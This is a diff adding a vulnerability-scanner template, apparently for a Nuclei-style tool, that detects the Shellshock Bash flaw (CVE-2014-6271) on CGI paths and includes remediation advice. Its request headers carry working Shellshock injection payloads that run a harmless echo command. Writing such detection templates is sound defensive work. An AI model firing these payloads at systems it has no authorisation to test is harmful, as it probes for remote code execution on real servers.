@@ -1,0 +1,32 @@
+id: shellshock-cgi
+info:
+  name: Shellshock Bash RCE via CGI (CVE-2014-6271)
+  severity: critical
+  tags: [cves-rce-critical, shellshock, bash, cgi, rce, cve-2014-6271]
+  description: "Detects CVE-2014-6271 (Shellshock), a vulnerability in GNU Bash that allows remote code execution via crafted environment variables. CGI scripts that invoke bash are directly exploitable through HTTP headers."
+  remediation: "Patch bash to a version that does not process function definitions past the end of the function body. Disable CGI scripts that invoke bash, or replace with a secure shell."
+  cwe: "CWE-78"
+  owasp: "A03:2021-Injection"
+
+requests:
+  - method: GET
+    paths:
+      - /cgi-bin/test.cgi
+      - /cgi-bin/status
+      - /cgi-bin/env.cgi
+      - /cgi-bin/printenv
+      - /cgi-bin/test-cgi
+    headers:
+      User-Agent: "() { :;}; echo Content-Type: text/plain; echo; echo shellshocked"
+      Referer: "() { :;}; echo shellshocked;"
+      Cookie: "() { :;}; echo shellshocked;"
+    stop-at-first-match: false
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "shellshocked"
+        part: body
+      - type: status
+        status: [200]
